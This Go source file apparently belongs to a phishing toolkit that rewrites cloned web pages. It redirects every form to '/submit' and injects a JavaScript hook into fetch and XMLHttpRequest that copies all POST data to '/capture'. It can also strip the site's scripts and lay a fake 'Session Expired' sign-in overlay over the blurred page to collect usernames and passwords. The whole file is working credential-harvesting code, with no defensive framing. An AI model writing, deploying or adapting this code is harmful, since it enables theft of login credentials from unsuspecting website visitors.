package rewriter

import (
	"bytes"
	"fmt"
	"strings"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

// captureScript is injected as the first child of <head> so our fetch/XHR
// hooks are in place before any site JavaScript runs.
const captureScript = `(function(){
  function beacon(obj){
    try{
      var p=new URLSearchParams();
      for(var k in obj){if(obj.hasOwnProperty(k))p.append(k,obj[k]);}
      if(navigator.sendBeacon){navigator.sendBeacon('/capture',p);}
      else{fetch('/capture',{method:'POST',body:p,keepalive:true});}
    }catch(e){}
  }
  function extract(b){
    var o={};
    if(b instanceof URLSearchParams){b.forEach(function(v,k){o[k]=v;});}
    else if(b instanceof FormData){b.forEach(function(v,k){if(typeof v==='string')o[k]=v;});}
    else if(typeof b==='string'){
      try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
      catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
    }
    return o;
  }
  var _f=window.fetch;
  window.fetch=function(url,opts){
    try{
      if(opts&&/post/i.test(opts.method||'')&&opts.body){
        var o=extract(opts.body);
        if(Object.keys(o).length)beacon(o);
      }
    }catch(e){}
    return _f.apply(this,arguments);
  };
  var _o=XMLHttpRequest.prototype.open,_s=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m){this._csm=m;return _o.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){
    try{
      if(/post/i.test(this._csm||'')&&b){
        var o=extract(b);
        if(Object.keys(o).length)beacon(o);
      }
    }catch(e){}
    return _s.apply(this,arguments);
  };
})();`

const overlayCSS = `
#cs-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
#cs-backdrop{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);backdrop-filter:blur(3px)}
#cs-card{position:relative;max-width:380px;margin:15vh auto;background:#fff;border-radius:8px;padding:36px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
#cs-card h2{margin:0 0 6px;font-size:22px;font-weight:600;color:#1a1a1a}
#cs-card p{margin:0 0 24px;color:#666;font-size:14px}
#cs-card input{display:block;width:100%;padding:11px 12px;margin:0 0 14px;border:1px solid #d0d0d0;border-radius:4px;font-size:14px;box-sizing:border-box;background:#fff;color:#1a1a1a}
#cs-card input:focus{outline:none;border-color:#0066cc;box-shadow:0 0 0 2px rgba(0,102,204,.2)}
#cs-card button{display:block;width:100%;padding:11px;margin-top:6px;background:#0066cc;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer}
#cs-card button:hover{background:#0052a3}
`

const overlayHTML = `<div id="cs-overlay"><div id="cs-backdrop"></div><div id="cs-card"><h2>Session Expired</h2><p>Please sign in to continue</p><form method="POST" action="/submit" autocomplete="on"><input type="text" name="username" placeholder="Email or username" required autofocus><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></div>`

// RewriteForms parses HTML, rewrites all <form> action attributes to "/submit",
// injects the credential capture script into <head>, then renders the document.
func RewriteForms(htmlContent string) (string, error) {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		return "", fmt.Errorf("parse HTML: %w", err)
	}

	rewriteNode(doc)
	injectCaptureScript(doc)

	var buf bytes.Buffer
	if err := html.Render(&buf, doc); err != nil {
		return "", fmt.Errorf("render HTML: %w", err)
	}
	return buf.String(), nil
}

// ApplyOverlay strips all site scripts and injects a themed login overlay
// on top of the cloned page. The cloned site becomes a blurred backdrop.
func ApplyOverlay(htmlContent string) (string, error) {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		return "", fmt.Errorf("parse HTML: %w", err)
	}

	stripScripts(doc)
	injectOverlay(doc)

	var buf bytes.Buffer
	if err := html.Render(&buf, doc); err != nil {
		return "", fmt.Errorf("render HTML: %w", err)
	}
	return buf.String(), nil
}

// injectCaptureScript prepends the capture script as the first child of <head>.
func injectCaptureScript(doc *html.Node) {
	head := findNode(doc, "head")
	if head == nil {
		return
	}
	script := &html.Node{Type: html.ElementNode, Data: "script"}
	script.AppendChild(&html.Node{Type: html.TextNode, Data: captureScript})
	head.InsertBefore(script, head.FirstChild)
}

// stripScripts removes all <script> elements from the document tree.
func stripScripts(n *html.Node) {
	var next *html.Node
	for c := n.FirstChild; c != nil; c = next {
		next = c.NextSibling
		if c.Type == html.ElementNode && c.Data == "script" {
			n.RemoveChild(c)
			continue
		}
		stripScripts(c)
	}
}

// injectOverlay appends the overlay style and markup to <body>.
func injectOverlay(doc *html.Node) {
	body := findNode(doc, "body")
	if body == nil {
		return
	}

	// Inject CSS
	style := &html.Node{Type: html.ElementNode, Data: "style"}
	style.AppendChild(&html.Node{Type: html.TextNode, Data: overlayCSS})
	body.AppendChild(style)

	// Parse overlay HTML fragment and append to body
	context := &html.Node{
		Type:     html.ElementNode,
		DataAtom: atom.Body,
		Data:     "body",
	}
	nodes, err := html.ParseFragment(strings.NewReader(overlayHTML), context)
	if err != nil {
		return
	}
	for _, n := range nodes {
		body.AppendChild(n)
	}
}

func rewriteNode(n *html.Node) {
	if n.Type == html.ElementNode && n.Data == "form" {
		hasAction := false
		for i, a := range n.Attr {
			if strings.ToLower(a.Key) == "action" {
				n.Attr[i].Val = "/submit"
				hasAction = true
			}
		}
		if !hasAction {
			n.Attr = append(n.Attr, html.Attribute{Key: "action", Val: "/submit"})
		}
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		rewriteNode(c)
	}
}

// findNode returns the first element with the given tag name, or nil.
func findNode(n *html.Node, tag string) *html.Node {
	if n.Type == html.ElementNode && n.Data == tag {
		return n
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if found := findNode(c, tag); found != nil {
			return found
		}
	}
	return nil
}
